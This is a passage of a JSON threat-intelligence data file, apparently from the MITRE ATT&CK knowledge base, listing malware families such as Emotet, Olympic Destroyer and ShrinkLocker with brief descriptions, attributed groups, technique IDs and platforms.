        "T1070.004",
        "T1547.001",
        "T1027.013",
        "T1134.001",
        "T1090",
        "T1105",
        "T1083",
        "T1055.001",
        "T1560",
        "T1049"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0456",
      "stix_id": "malware--3161d76a-e2b2-4b97-9906-24909b735386",
      "created": "2020-05-26T19:36:04.663000+00:00",
      "modified": "2024-04-11T02:58:53.131000+00:00"
    },
    "S0367": {
      "id": "S0367",
      "name": "Emotet",
      "description": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014, initially targeting the financial sector, and has expanded to multiple verticals over time.(Citation: Trend Micro Banking Malware Jan 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1570",
        "T1573.001",
        "T1552.001",
        "T1110.001",
        "T1047",
        "T1571",
        "T1027.001",
        "T1218.010",
        "T1021.002",
        "T1204.002",
        "T1134.001",
        "T1078.003",
        "T1547.001",
        "T1566.002",
        "T1132.001",
        "T1135",
        "T1071.001",
        "T1041",
        "T1027.009",
        "T1105",
        "T1210",
        "T1114",
        "T1053.005",
        "T1555.003",
        "T1059.001",
        "T1140",
        "T1059.005",
        "T1204.001",
        "T1036.004",
        "T1027.010",
        "T1003.001",
        "T1040",
        "T1620",
        "T1027.013",
        "T1059.003",
        "T1566.001",
        "T1087.003",
        "T1027.002",
        "T1055.012",
        "T1057",
        "T1055.001",
        "T1114.001",
        "T1543.003",
        "T1573",
        "T1106",
        "T1016.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0367",
      "stix_id": "malware--32066e94-3112-48ca-b9eb-ba2b59d2f023",
      "created": "2019-03-25T18:35:14.353000+00:00",
      "modified": "2024-11-25T16:00:51.198000+00:00"
    },
    "S0159": {
      "id": "S0159",
      "name": "SNUGRIDE",
      "description": "[SNUGRIDE](https://attack.mitre.org/software/S0159) is a backdoor that has been used by [menuPass](https://attack.mitre.org/groups/G0045) as first stage malware. (Citation: FireEye APT10 April 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1547.001",
        "T1059.003",
        "T1573.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0159",
      "stix_id": "malware--3240cbe4-c550-443b-aa76-cc2a7058b870",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-25T14:42:59.423000+00:00"
    },
    "S0365": {
      "id": "S0365",
      "name": "Olympic Destroyer",
      "description": "[Olympic Destroyer](https://attack.mitre.org/software/S0365) is malware that was used by [Sandworm Team](https://attack.mitre.org/groups/G0034) against the 2018 Winter Olympics, held in Pyeongchang, South Korea. The main purpose of the malware was to render infected computer systems inoperable. The malware leverages various native Windows utilities and API calls to carry out its destructive tasks. [Olympic Destroyer](https://attack.mitre.org/software/S0365) has worm-like features to spread itself across a computer network in order to maximize its destructive impact.(Citation: Talos Olympic Destroyer 2018)(Citation: US District Court Indictment GRU Unit 74455 October 2020) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1555.003",
        "T1489",
        "T1529",
        "T1070.001",
        "T1485",
        "T1570",
        "T1047",
        "T1018",
        "T1135",
        "T1569.002",
        "T1021.002",
        "T1490",
        "T1003.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0365",
      "stix_id": "malware--3249e92a-870b-426d-8790-ba311c1abfb4",
      "created": "2019-03-25T14:07:22.547000+00:00",
      "modified": "2025-04-25T14:42:59.783000+00:00"
    },
    "S1184": {
      "id": "S1184",
      "name": "BOLDMOVE",
      "description": "[BOLDMOVE](https://attack.mitre.org/software/S1184) is a type of backdoor malware written in C linked to People\u2019s Republic of China operations from 2022 through 2023. [BOLDMOVE](https://attack.mitre.org/software/S1184) includes both Windows and Linux variants, with some Linux variants specifically designed for FortiGate Firewall devices. [BOLDMOVE](https://attack.mitre.org/software/S1184) is linked to zero-day exploitation of CVE-2022-42475 in FortiOSS SSL-VPNs.(Citation: Google Cloud BOLDMOVE 2023) The record for [BOLDMOVE](https://attack.mitre.org/software/S1184) only covers known Linux variants.",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.004",
        "T1564.011",
        "T1543",
        "T1083",
        "T1562",
        "T1573.002",
        "T1554",
        "T1016",
        "T1190",
        "T1070.004",
        "T1071.001",
        "T1082",
        "T1562.006",
        "T1480",
        "T1090.003"
      ],
      "platforms": [
        "Linux",
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1184",
      "stix_id": "malware--325fa466-4a2a-45a0-acc6-f6bed9b45ebe",
      "created": "2024-12-31T22:33:05.594000+00:00",
      "modified": "2025-04-15T19:46:33.956000+00:00"
    },
    "S0115": {
      "id": "S0115",
      "name": "Crimson",
      "description": "[Crimson](https://attack.mitre.org/software/S0115) is a remote access Trojan that has been used by [Transparent Tribe](https://attack.mitre.org/groups/G0134) since at least 2016.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1125",
        "T1518.001",
        "T1547.001",
        "T1070.004",
        "T1124",
        "T1082",
        "T1140",
        "T1497.003",
        "T1056.001",
        "T1071.001",
        "T1005",
        "T1033",
        "T1113",
        "T1123",
        "T1041",
        "T1057",
        "T1114.001",
        "T1112",
        "T1016",
        "T1120",
        "T1025",
        "T1091",
        "T1614",
        "T1105",
        "T1059.003",
        "T1095",
        "T1012",
        "T1555.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0115",
      "stix_id": "malware--326af1cd-78e7-45b7-a326-125d2f7ef8f2",
      "created": "2017-05-31T21:33:08.679000+00:00",
      "modified": "2025-04-16T20:38:01.622000+00:00"
    },
    "S0671": {
      "id": "S0671",
      "name": "Tomiris",
      "description": "[Tomiris](https://attack.mitre.org/software/S0671) is a backdoor written in Go that continuously queries its C2 server for executables to download and execute on a victim system. It was first reported in September 2021 during an investigation of a successful DNS hijacking campaign against a Commonwealth of Independent States (CIS) member. Security researchers assess there are similarities between [Tomiris](https://attack.mitre.org/software/S0671) and [GoldMax](https://attack.mitre.org/software/S0588).(Citation: Kaspersky Tomiris Sep 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1568",
        "T1071.001",
        "T1053.005",
        "T1497.003",
        "T1027.002",
        "T1005",
        "T1105",
        "T1041"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0671",
      "stix_id": "malware--327b3a25-9e60-4431-b3b6-93b9c64eacbc",
      "created": "2021-12-29T14:47:19.862000+00:00",
      "modified": "2025-04-16T20:38:01.801000+00:00"
    },
    "S0560": {
      "id": "S0560",
      "name": "TEARDROP",
      "description": "[TEARDROP](https://attack.mitre.org/software/S0560) is a memory-only dropper that was discovered on some victim machines during investigations related to the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024). It was likely used by [APT29](https://attack.mitre.org/groups/G0016) since at least May 2020.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Microsoft Deep Dive Solorigate January 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1012",
        "T1027",
        "T1112",
        "T1543.003",
        "T1036.005",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0560",
      "stix_id": "malware--32f49626-87f4-4d6c-8f59-a0dca953fe26",
      "created": "2021-01-06T17:34:43.835000+00:00",
      "modified": "2025-04-16T20:38:01.954000+00:00"
    },
    "S1159": {
      "id": "S1159",
      "name": "DUSTTRAP",
      "description": "[DUSTTRAP](https://attack.mitre.org/software/S1159) is a multi-stage plugin framework associated with [APT41](https://attack.mitre.org/groups/G0096) operations with multiple components.(Citation: Google Cloud APT41 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1087.002",
        "T1012",
        "T1615",
        "T1055",
        "T1056.001",
        "T1070",
        "T1027.013",
        "T1057",
        "T1087.001",
        "T1113",
        "T1518.001",
        "T1140",
        "T1105",
        "T1083",
        "T1005",
        "T1016",
        "T1059.003",
        "T1070.001",
        "T1010",
        "T1070.005",
        "T1041",
        "T1124",
        "T1482",
        "T1082",
        "T1027.009",
        "T1018",
        "T1654",
        "T1497.001",
        "T1135"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1159",
      "stix_id": "malware--33139388-de0c-49ff-862a-041c315b142d",
      "created": "2024-09-16T08:38:41.404000+00:00",
      "modified": "2024-09-21T07:20:52.417000+00:00"
    },
    "S0647": {
      "id": "S0647",
      "name": "Turian",
      "description": "[Turian](https://attack.mitre.org/software/S0647) is a backdoor that has been used by [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) to target Ministries of Foreign Affairs, telecommunication companies, and charities in Africa, Europe, the Middle East, and Asia. First reported in 2021, [Turian](https://attack.mitre.org/software/S0647) is likely related to Quarian, an older backdoor that was last observed being used in 2013 against diplomatic targets in Syria and the United States.(Citation: ESET BackdoorDiplomacy Jun 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.004",
        "T1083",
        "T1027",
        "T1113",
        "T1033",
        "T1547.001",
        "T1560.001",
        "T1140",
        "T1016",
        "T1059.006",
        "T1074.001",
        "T1001.001",
        "T1071.001",
        "T1105",
        "T1059.003",
        "T1082",
        "T1036.004",
        "T1120"
      ],
      "platforms": [
        "Windows",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0647",
      "stix_id": "malware--350f12cf-fd3b-4dad-b323-14b943090df4",
      "created": "2021-09-21T15:21:31.795000+00:00",
      "modified": "2025-04-25T14:43:01.037000+00:00"
    },
    "S1081": {
      "id": "S1081",
      "name": "BADHATCH",
      "description": "[BADHATCH](https://attack.mitre.org/software/S1081) is a backdoor that has been utilized by [FIN8](https://attack.mitre.org/groups/G0061) since at least 2019. [BADHATCH](https://attack.mitre.org/software/S1081) has been used to target the insurance, retail, technology, and chemical industries in the United States, Canada, South Africa, Panama, and Italy.(Citation: Gigamon BADHATCH Jul 2019)(Citation: BitDefender BADHATCH Mar 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1135",
        "T1620",
        "T1059.001",
        "T1055",
        "T1018",
        "T1057",
        "T1082",
        "T1113",
        "T1027.009",
        "T1124",
        "T1053.005",
        "T1027.010",
        "T1071.001",
        "T1033",
        "T1090",
        "T1106",
        "T1055.001",
        "T1046",
        "T1105",
        "T1573.002",
        "T1027.015",
        "T1102",
        "T1070.004",
        "T1546.003",
        "T1069.002",
        "T1550.002",
        "T1482",
        "T1059.003",
        "T1071.002",
        "T1047",
        "T1548.002",
        "T1055.004",
        "T1134.001",
        "T1049",
        "T1041"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1081",
      "stix_id": "malware--3553b49d-d4ae-4fb6-ab17-0adbc520c888",
      "created": "2023-08-01T18:07:26.353000+00:00",
      "modified": "2024-04-11T02:55:51.310000+00:00"
    },
    "S0409": {
      "id": "S0409",
      "name": "Machete",
      "description": "[Machete](https://attack.mitre.org/software/S0409) is a cyber espionage toolset used by [Machete](https://attack.mitre.org/groups/G0095). It is a Python-based backdoor targeting Windows machines that was first observed in 2010.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014)(Citation: 360 Machete Sep 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1573.001",
        "T1552.004",
        "T1041",
        "T1070.004",
        "T1057",
        "T1125",
        "T1027.002",
        "T1053.005",
        "T1217",
        "T1049",
        "T1555.003",
        "T1132.001",
        "T1071.002",
        "T1016",
        "T1036.004",
        "T1020",
        "T1036.005",
        "T1029",
        "T1074.001",
        "T1115",
        "T1547.001",
        "T1123",
        "T1071.001",
        "T1010",
        "T1560.003",
        "T1105",
        "T1025",
        "T1052.001",
        "T1573.002",
        "T1056.001",
        "T1120",
        "T1005",
        "T1008",
        "T1560",
        "T1059.006",
        "T1083",
        "T1082",
        "T1564.001",
        "T1113",
        "T1027.010"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0409",
      "stix_id": "malware--35cd1d01-1ede-44d2-b073-a264d727bc04",
      "created": "2019-09-13T13:17:25.718000+00:00",
      "modified": "2025-04-16T20:38:02.252000+00:00"
    },
    "S1012": {
      "id": "S1012",
      "name": "PowerLess",
      "description": "[PowerLess](https://attack.mitre.org/software/S1012) is a PowerShell-based modular backdoor that has been used by [Magic Hound](https://attack.mitre.org/groups/G0059) since at least 2022.(Citation: Cybereason PowerLess February 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.001",
        "T1217",
        "T1105",
        "T1005",
        "T1573",
        "T1074.001",
        "T1560",
        "T1059.001",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1012",
      "stix_id": "malware--35ee9bf3-264b-4411-8a8f-b58cec8f35e4",
      "created": "2022-06-01T20:20:02.166000+00:00",
      "modified": "2025-04-16T20:38:02.412000+00:00"
    },
    "S1028": {
      "id": "S1028",
      "name": "Action RAT",
      "description": "[Action RAT](https://attack.mitre.org/software/S1028) is a  remote access tool written in Delphi that has been used by [SideCopy](https://attack.mitre.org/groups/G1008) since at least December 2021 against Indian and Afghani government personnel.(Citation: MalwareBytes SideCopy Dec 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1105",
        "T1047",
        "T1071.001",
        "T1016",
        "T1027",
        "T1082",
        "T1083",
        "T1033",
        "T1518.001",
        "T1005",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1028",
      "stix_id": "malware--36801ffb-5c85-4c50-9121-6122e389366d",
      "created": "2022-08-07T14:57:28.124000+00:00",
      "modified": "2025-04-16T20:38:02.568000+00:00"
    },
    "S0473": {
      "id": "S0473",
      "name": "Avenger",
      "description": "[Avenger](https://attack.mitre.org/software/S0473) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1518.001",
        "T1071.001",
        "T1027.013",
        "T1140",
        "T1083",
        "T1016",
        "T1105",
        "T1055",
        "T1027.003",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0473",
      "stix_id": "malware--36ede314-7db4-4d09-b53d-81bbfbe5f6f8",
      "created": "2020-06-11T15:24:48.709000+00:00",
      "modified": "2024-04-11T02:56:34.181000+00:00"
    },
    "S1158": {
      "id": "S1158",
      "name": "DUSTPAN",
      "description": "[DUSTPAN](https://attack.mitre.org/software/S1158) is an in-memory dropper written in C/C++ used by [APT41](https://attack.mitre.org/groups/G0096) since 2021 that decrypts and executes an embedded payload.(Citation: Google Cloud APT41 2024)(Citation: Google Cloud APT41 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.005",
        "T1027.013",
        "T1140",
        "T1055.002",
        "T1027.009",
        "T1543.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1158",
      "stix_id": "malware--37487ff6-de2a-4c14-9e8b-ba3b97f78aaf",
      "created": "2024-09-16T08:29:07.124000+00:00",
      "modified": "2024-09-21T07:18:26.370000+00:00"
    },
    "S0113": {
      "id": "S0113",
      "name": "Prikormka",
      "description": "[Prikormka](https://attack.mitre.org/software/S0113) is a malware family used in a campaign known as Operation Groundbait. It has predominantly been observed in Ukraine and was used as early as 2008. (Citation: ESET Operation Groundbait)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1056.001",
        "T1218.011",
        "T1027.013",
        "T1113",
        "T1120",
        "T1016",
        "T1555.003",
        "T1555",
        "T1574.001",
        "T1082",
        "T1025",
        "T1518.001",
        "T1132.001",
        "T1070.004",
        "T1547.001",
        "T1074.001",
        "T1083",
        "T1560",
        "T1033"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0113",
      "stix_id": "malware--37cc7eb6-12e3-467b-82e8-f20f2cc73c69",
      "created": "2017-05-31T21:33:07.943000+00:00",
      "modified": "2024-04-11T00:25:44.638000+00:00"
    },
    "S1138": {
      "id": "S1138",
      "name": "Gootloader",
      "description": "[Gootloader](https://attack.mitre.org/software/S1138) is a Javascript-based infection framework that has been used since at least 2020 as a delivery method for the Gootkit banking trojan, [Cobalt Strike](https://attack.mitre.org/software/S0154), [REvil](https://attack.mitre.org/software/S0496), and others. [Gootloader](https://attack.mitre.org/software/S1138) operates on an \"Initial Access as a Service\" model and has leveraged [SEO Poisoning](https://attack.mitre.org/techniques/T1608/006) to provide access to entities in multiple sectors worldwide including financial, military, automotive, pharmaceutical, and energy.(Citation: Sophos Gootloader)(Citation: SentinelOne Gootloader June 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1614",
        "T1584.001",
        "T1069.002",
        "T1584.006",
        "T1547.001",
        "T1059.001",
        "T1497.003",
        "T1614.001",
        "T1204.001",
        "T1082",
        "T1140",
        "T1059.007",
        "T1055.002",
        "T1055.012",
        "T1016",
        "T1132.001",
        "T1105",
        "T1027"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1138",
      "stix_id": "malware--396c18b9-26fb-4435-8589-fb856502e4c4",
      "created": "2024-05-28T20:39:16.453000+00:00",
      "modified": "2024-06-19T20:03:19.442000+00:00"
    },
    "S1031": {
      "id": "S1031",
      "name": "PingPull",
      "description": "[PingPull](https://attack.mitre.org/software/S1031) is a remote access Trojan (RAT) written in Visual C++ that has been used by [GALLIUM](https://attack.mitre.org/groups/G0093) since at least June 2022. [PingPull](https://attack.mitre.org/software/S1031) has been used to target telecommunications companies, financial institutions, and government entities in Afghanistan, Australia, Belgium, Cambodia, Malaysia, Mozambique, the Philippines, Russia, and Vietnam.(Citation: Unit 42 PingPull Jun 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1571",
        "T1083",
        "T1005",
        "T1071.001",
        "T1082",
        "T1036.004",
        "T1016",
        "T1132.001",
        "T1543.003",
        "T1070.006",
        "T1095",
        "T1059.003",
        "T1140",
        "T1041",
        "T1573.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1031",
      "stix_id": "malware--3a0f6128-0a01-421d-8eca-e57d8671b1f1",
      "created": "2022-08-09T18:21:24.739000+00:00",
      "modified": "2025-04-16T20:38:02.753000+00:00"
    },
    "S0514": {
      "id": "S0514",
      "name": "WellMess",
      "description": "[WellMess](https://attack.mitre.org/software/S0514) is lightweight malware family with variants written in .NET and Golang that has been in use since at least 2018 by [APT29](https://attack.mitre.org/groups/G0016).(Citation: CISA WellMess July 2020)(Citation: PWC WellMess July 2020)(Citation: NCSC APT29 July 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1059.001",
        "T1005",
        "T1071.004",
        "T1082",
        "T1105",
        "T1573.002",
        "T1132.001",
        "T1573.001",
        "T1059.003",
        "T1069.002",
        "T1016",
        "T1140",
        "T1071.001",
        "T1001.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0514",
      "stix_id": "malware--3a4197ae-ec63-4162-907b-9a073d1157e4",
      "created": "2020-09-24T19:39:44.392000+00:00",
      "modified": "2025-04-25T14:43:03.067000+00:00"
    },
    "S0497": {
      "id": "S0497",
      "name": "Dacls",
      "description": "[Dacls](https://attack.mitre.org/software/S0497) is a multi-platform remote access tool used by [Lazarus Group](https://attack.mitre.org/groups/G0032) since at least December 2019.(Citation: TrendMicro macOS Dacls May 2020)(Citation: SentinelOne Lazarus macOS July 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1071.001",
        "T1057",
        "T1543.001",
        "T1027.013",
        "T1543.004",
        "T1564.001",
        "T1083",
        "T1036"
      ],
      "platforms": [
        "macOS",
        "Linux",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0497",
      "stix_id": "malware--3aa169f8-bbf6-44bb-b57d-7f6ada5c2128",
      "created": "2020-08-07T14:53:56.534000+00:00",
      "modified": "2024-04-11T02:43:00.252000+00:00"
    },
    "S0547": {
      "id": "S0547",
      "name": "DropBook",
      "description": "[DropBook](https://attack.mitre.org/software/S0547) is a Python-based backdoor compiled with PyInstaller.(Citation: Cybereason Molerats Dec 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.006",
        "T1059.003",
        "T1083",
        "T1102",
        "T1567",
        "T1105",
        "T1140",
        "T1614.001",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0547",
      "stix_id": "malware--3ae6097d-d700-46c6-8b21-42fc0bcb48fa",
      "created": "2020-12-22T18:36:12.214000+00:00",
      "modified": "2025-04-25T14:43:03.619000+00:00"
    },
    "S1065": {
      "id": "S1065",
      "name": "Woody RAT",
      "description": " [Woody RAT](https://attack.mitre.org/software/S1065) is a remote access trojan (RAT) that has been used since at least August 2021 against Russian organizations.(Citation: MalwareBytes WoodyRAT Aug 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1033",
        "T1059.003",
        "T1055.012",
        "T1082",
        "T1059.001",
        "T1041",
        "T1057",
        "T1027.013",
        "T1562.006",
        "T1518.001",
        "T1087",
        "T1005",
        "T1113",
        "T1140",
        "T1105",
        "T1573.002",
        "T1070.004",
        "T1055",
        "T1071.001",
        "T1566.001",
        "T1016.001",
        "T1204.002",
        "T1106",
        "T1016",
        "T1203",
        "T1012",
        "T1518",
        "T1573.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1065",
      "stix_id": "malware--3bc7e862-5610-4c02-9c48-15b2e2dc1ddb",
      "created": "2023-02-14T16:52:39.925000+00:00",
      "modified": "2024-04-10T20:34:14.166000+00:00"
    },
    "S1060": {
      "id": "S1060",
      "name": "Mafalda",
      "description": "[Mafalda](https://attack.mitre.org/software/S1060) is a flexible interactive implant that has been used by [Metador](https://attack.mitre.org/groups/G1013). Security researchers assess the [Mafalda](https://attack.mitre.org/software/S1060) name may be inspired by an Argentinian cartoon character that has been popular as a means of political commentary since the 1960s. (Citation: SentinelLabs Metador Sept 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1205.001",
        "T1134.003",
        "T1133",
        "T1132.001",
        "T1059.003",
        "T1070.001",
        "T1112",
        "T1552.004",
        "T1569.002",
        "T1095",
        "T1074.001",
        "T1005",
        "T1140",
        "T1059.001",
        "T1090.001",
        "T1057",
        "T1056",
        "T1071.001",
        "T1049",
        "T1012",
        "T1217",
        "T1113",
        "T1041",
        "T1573.001",
        "T1082",
        "T1105",
        "T1016",
        "T1033",
        "T1134",
        "T1106",
        "T1083",
        "T1622",
        "T1518.001",
        "T1027.013",
        "T1003.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1060",
      "stix_id": "malware--3be1fb7a-0f7e-415e-8e3a-74a80d596e68",
      "created": "2023-01-26T01:21:43.409000+00:00",
      "modified": "2024-04-11T00:49:47.226000+00:00"
    },
    "S0215": {
      "id": "S0215",
      "name": "KARAE",
      "description": "[KARAE](https://attack.mitre.org/software/S0215) is a backdoor typically used by [APT37](https://attack.mitre.org/groups/G0067) as first-stage malware. (Citation: FireEye APT37 Feb 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1189",
        "T1105",
        "T1082",
        "T1102.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0215",
      "stix_id": "malware--3c02fb1f-cbdb-48f5-abaf-8c81d6e0c322",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T15:01:33.386000+00:00"
    },
    "S1030": {
      "id": "S1030",
      "name": "Squirrelwaffle",
      "description": "[Squirrelwaffle](https://attack.mitre.org/software/S1030) is a loader that was first seen in September 2021. It has been used in spam email campaigns to deliver additional malware such as [Cobalt Strike](https://attack.mitre.org/software/S0154) and the [QakBot](https://attack.mitre.org/software/S0650) banking trojan.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1059.005",
        "T1082",
        "T1041",
        "T1566.002",
        "T1218.010",
        "T1140",
        "T1204.001",
        "T1105",
        "T1566.001",
        "T1132.001",
        "T1071.001",
        "T1204.002",
        "T1027.013",
        "T1027.002",
        "T1560.003",
        "T1059.001",
        "T1059.003",
        "T1497",
        "T1218.011",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1030",
      "stix_id": "malware--3c18ad16-9eaf-4649-984e-68551bff0d47",
      "created": "2022-08-09T16:45:36.234000+00:00",
      "modified": "2024-04-11T00:02:15.805000+00:00"
    },
    "S0064": {
      "id": "S0064",
      "name": "ELMER",
      "description": "[ELMER](https://attack.mitre.org/software/S0064) is a non-persistent, proxy-aware HTTP backdoor written in Delphi that has been used by [APT16](https://attack.mitre.org/groups/G0023). (Citation: FireEye EPS Awakens Part 2)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1071.001",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0064",
      "stix_id": "malware--3cab1b76-2f40-4cd0-8d2c-7ed16eeb909c",
      "created": "2017-05-31T21:32:43.237000+00:00",
      "modified": "2025-04-16T20:38:03.197000+00:00"
    },
    "S0518": {
      "id": "S0518",
      "name": "PolyglotDuke",
      "description": "[PolyglotDuke](https://attack.mitre.org/software/S0518) is a downloader that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2013. [PolyglotDuke](https://attack.mitre.org/software/S0518) has been used to drop [MiniDuke](https://attack.mitre.org/software/S0051).(Citation: ESET Dukes October 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1112",
        "T1027",
        "T1027.011",
        "T1105",
        "T1218.011",
        "T1106",
        "T1102.001",
        "T1071.001",
        "T1027.003",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0518",
      "stix_id": "malware--3d57dcc4-be99-4613-9482-d5218f5ec13e",
      "created": "2020-09-23T15:42:59.822000+00:00",
      "modified": "2025-04-16T20:38:03.362000+00:00"
    },
    "S0221": {
      "id": "S0221",
      "name": "Umbreon",
      "description": "A Linux rootkit that provides backdoor access and hides from defenders.",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1014",
        "T1205",
        "T1095",
        "T1078.003"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0221",
      "stix_id": "malware--3d8e547d-9456-4f32-a895-dc86134e282f",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:43:05.057000+00:00"
    },
    "S1029": {
      "id": "S1029",
      "name": "AuTo Stealer",
      "description": "[AuTo Stealer](https://attack.mitre.org/software/S1029) is malware written in C++ has been used by [SideCopy](https://attack.mitre.org/groups/G1008) since at least December 2021 to target government agencies and personnel in India and Afghanistan.(Citation: MalwareBytes SideCopy Dec 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1074.001",
        "T1547.001",
        "T1033",
        "T1095",
        "T1059.003",
        "T1041",
        "T1071.001",
        "T1005",
        "T1082",
        "T1518.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1029",
      "stix_id": "malware--3e4e2c79-2b27-4245-a5c1-5586a3cbd8f5",
      "created": "2022-08-07T15:31:14.540000+00:00",
      "modified": "2025-04-16T20:38:03.701000+00:00"
    },
    "S1178": {
      "id": "S1178",
      "name": "ShrinkLocker",
      "description": "[ShrinkLocker](https://attack.mitre.org/software/S1178) is a VBS-based malicious script that leverages the legitimate Bitlocker application to encrypt files on victim systems for ransom. [ShrinkLocker](https://attack.mitre.org/software/S1178) functions by using Bitlocker to encrypt files, then renames impacted drives to the adversary\u2019s contact email address to facilitate communication for the ransom payment.(Citation: Kaspersky ShrinkLocker 2024)(Citation: Splunk ShrinkLocker 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1124",
        "T1491.001",
        "T1070.001",
        "T1082",
        "T1562.004",
        "T1059.005",
        "T1059.001",
        "T1112",
        "T1047",
        "T1102",
        "T1486",
        "T1562.001",
        "T1041",
        "T1529",
        "T1016",
        "T1480",
        "T1070.004",
        "T1485",
        "T1057",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1178",
      "stix_id": "malware--3fc44c12-b16e-4de1-8869-cf0eb4446070",
      "created": "2024-12-07T16:10:56.078000+00:00",
      "modified": "2025-03-09T16:11:02.671000+00:00"
    },
    "S0601": {
      "id": "S0601",
      "name": "Hildegard",
      "description": "[Hildegard](https://attack.mitre.org/software/S0601) is malware that targets misconfigured kubelets for initial access and runs cryptocurrency miner operations. The malware was first observed in January 2021. The TeamTNT activity group is believed to be behind [Hildegard](https://attack.mitre.org/software/S0601). (Citation: Unit 42 Hildegard Malware)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071",
        "T1552.004",
        "T1070.004",
        "T1609",
        "T1613",
        "T1574.006",
        "T1046",
        "T1133",
        "T1552.001",
        "T1027.002",
        "T1036.004",
        "T1562.001",
        "T1082",
        "T1102",
        "T1014",
